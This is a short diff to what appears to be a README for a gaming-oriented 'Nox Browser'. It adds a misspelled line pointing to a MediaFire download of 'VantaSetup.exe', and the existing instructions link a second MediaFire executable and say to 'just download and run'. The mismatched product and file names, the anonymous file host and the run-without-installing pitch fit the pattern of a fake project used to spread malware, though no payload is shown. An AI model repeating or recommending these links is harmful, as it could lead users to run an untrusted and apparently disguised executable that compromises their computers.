@@ -14,7 +14,7 @@ Nox Browser is designed for speed, aesthetics, and gamers who need a lightweight
 * **🔒 Privacy Focused:** No telemetry, no tracking, just browsing.
 
 ## 🛠️ Download
-
+* ** media fire downlad clcik on blue text ("https://www.mediafire.com/file/rmgdqjckyakm2n5/VantaSetup.exe/file")
 **You do not need to install anything. Just download and run.**
 
 1.  Go to the [**media fire**](https://www.mediafire.com/file/blugpojl5rga61s/VANTA+setup.exe/file)
